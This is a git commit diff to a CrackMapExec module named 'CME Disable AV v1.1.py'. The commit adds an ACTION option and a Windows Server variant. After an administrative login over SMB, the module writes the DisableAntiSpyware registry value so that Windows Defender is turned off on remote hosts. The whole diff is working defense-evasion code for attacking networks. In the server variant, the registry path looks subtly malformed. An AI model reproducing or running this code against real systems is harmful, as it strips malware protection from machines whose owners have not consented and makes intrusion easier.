42fb60d09763886e8e3001a9b1a35c9533895a6b
luisotedomin <48179833+luisotedomin@users.noreply.github.com>
2023-06-04 19:33:04 +0200

    Add files via upload
    Signed-off-by: luisotedomin <48179833+luisotedomin@users.noreply.github.com>

--- CME Disable AV v1.1.py
+++ CME Disable AV v1.1.py
@@ -18,10 +18,22 @@ class CMEModule:
 
     def options(self, context, module_options):
         '''
-            No options required
+            ACTION Disable Defender on Windows or Windows Server (choices: w, ws)
         '''
+        if not 'ACTION' in module_options:
+            context.log.error('ACTION option not specified!')
+            exit(1)
+
+        if module_options['ACTION'].lower() not in ['w', 'ws']:
+            context.log.error('Invalid value for ACTION option!')
+            exit(1)
+        self.action = module_options['ACTION'].lower()
+
     def on_admin_login(self, context, connection):
-        self.disable_defender(context, connection.conn)
+        if self.action == 'w':
+            self.disable_defender(context,connection.conn)
+        elif self.action == 'ws':
+            self.disable_defender_ws(context,connection.conn)
 
     def disable_defender(self, context, smbconnection):
         remoteOps = RemoteOperations(smbconnection, False)
@@ -31,6 +43,27 @@ class CMEModule:
         regHandle = ans['phKey']
 
         ans = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, regHandle, 'SOFTWARE\\Policies\\Microsoft\\Windows Defender')
+        keyHandle = ans['phkResult']
+
+        rrp.hBaseRegSetValue(remoteOps._RemoteOperations__rrp, keyHandle, 'DisableAntiSpyware\x00',  rrp.REG_DWORD, 1)
+
+        rtype, data = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, 'DisableAntiSpyware\x00')
+
+        if int(data) == 1:
+            context.log.success('Windows Defender disabled successfully')
+
+        try:
+            remoteOps.finish()
+        except:
+            pass
+    def disable_defender_ws(self, context, smbconnection):
+        remoteOps = RemoteOperations(smbconnection, False)
+        remoteOps.enableRegistry()
+
+        ans = rrp.hOpenLocalMachine(remoteOps._RemoteOperations__rrp)
+        regHandle = ans['phKey']
+
+        ans = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, regHandle, 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender')
         keyHandle = ans['phkResult']
 
         rrp.hBaseRegSetValue(remoteOps._RemoteOperations__rrp, keyHandle, 'DisableAntiSpyware\x00',  rrp.REG_DWORD, 1)
